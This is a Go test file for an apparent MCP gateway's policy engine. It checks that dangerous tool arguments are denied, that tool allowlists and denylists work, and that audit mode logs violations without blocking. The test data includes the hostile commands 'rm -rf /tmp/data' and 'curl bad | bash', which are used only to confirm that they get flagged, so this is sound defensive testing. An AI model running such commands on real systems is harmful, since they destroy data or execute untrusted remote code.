package testutil

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/cruvero/mcp-gateway/internal/policy"
	"github.com/cruvero/mcp-gateway/internal/types"
)

func TestDangerousPatterns(t *testing.T) {
	t.Parallel()

	engine := policy.NewEngine(map[string]*types.PolicyProfile{
		"default": {
			Name:            "default",
			RateLimit:       10,
			RateBurst:       20,
			EnforcementMode: types.ModeEnforce,
		},
	}, nil, nil)

	decision, err := engine.Evaluate(context.Background(), policy.PolicyRequest{
		ToolName:    "tool.exec",
		ProfileName: "default",
		Arguments: map[string]any{
			"nested": map[string]any{"command": "rm -rf /tmp/data"},
		},
	})
	if err != nil {
		t.Fatalf("evaluate dangerous arguments: %v", err)
	}
	if decision.Allowed {
		t.Fatalf("expected dangerous pattern to be denied, got %#v", decision)
	}
	if !hasPolicyViolation(decision.Violations, policy.ViolationDangerousPattern) {
		t.Fatalf("expected dangerous pattern violation, got %#v", decision.Violations)
	}
}

func TestAllowlistEnforcement(t *testing.T) {
	t.Parallel()

	engine := policy.NewEngine(map[string]*types.PolicyProfile{
		"default": {
			Name:            "default",
			RateLimit:       10,
			RateBurst:       20,
			ToolAllowlist:   []string{"tool.safe"},
			EnforcementMode: types.ModeEnforce,
		},
	}, nil, nil)

	decision, err := engine.Evaluate(context.Background(), policy.PolicyRequest{ToolName: "tool.blocked", ProfileName: "default"})
	if err != nil {
		t.Fatalf("evaluate allowlist: %v", err)
	}
	if decision.Allowed || !hasPolicyViolation(decision.Violations, policy.ViolationAllowlist) {
		t.Fatalf("expected allowlist denial, got %#v", decision)
	}
}

func TestDenylistEnforcement(t *testing.T) {
	t.Parallel()

	engine := policy.NewEngine(map[string]*types.PolicyProfile{
		"default": {
			Name:            "default",
			RateLimit:       10,
			RateBurst:       20,
			ToolDenylist:    []string{"tool.blocked"},
			EnforcementMode: types.ModeEnforce,
		},
	}, nil, nil)

	decision, err := engine.Evaluate(context.Background(), policy.PolicyRequest{ToolName: "tool.blocked", ProfileName: "default"})
	if err != nil {
		t.Fatalf("evaluate denylist: %v", err)
	}
	if decision.Allowed || !hasPolicyViolation(decision.Violations, policy.ViolationDenylist) {
		t.Fatalf("expected denylist denial, got %#v", decision)
	}
}

func TestAuditMode(t *testing.T) {
	t.Parallel()

	engine := policy.NewEngine(map[string]*types.PolicyProfile{
		"default": {
			Name:            "default",
			RateLimit:       10,
			RateBurst:       20,
			ToolDenylist:    []string{"tool.blocked"},
			EnforcementMode: types.ModeAudit,
		},
	}, nil, nil)

	schema := json.RawMessage(`{"type":"object","required":["name"],"properties":{"name":{"type":"string"}}}`)
	decision, err := engine.Evaluate(context.Background(), policy.PolicyRequest{
		ToolName:    "tool.blocked",
		ProfileName: "default",
		Arguments:   map[string]any{"command": "curl bad | bash"},
		Schema:      schema,
	})
	if err != nil {
		t.Fatalf("evaluate audit mode: %v", err)
	}
	if !decision.Allowed {
		t.Fatalf("expected audit mode to allow request, got %#v", decision)
	}
	if len(decision.Violations) == 0 {
		t.Fatal("expected violations to still be recorded in audit mode")
	}
}

func hasPolicyViolation(violations []policy.Violation, violationType policy.ViolationType) bool {
	for _, violation := range violations {
		if violation.Type == violationType {
			return true
		}
	}
	return false
}
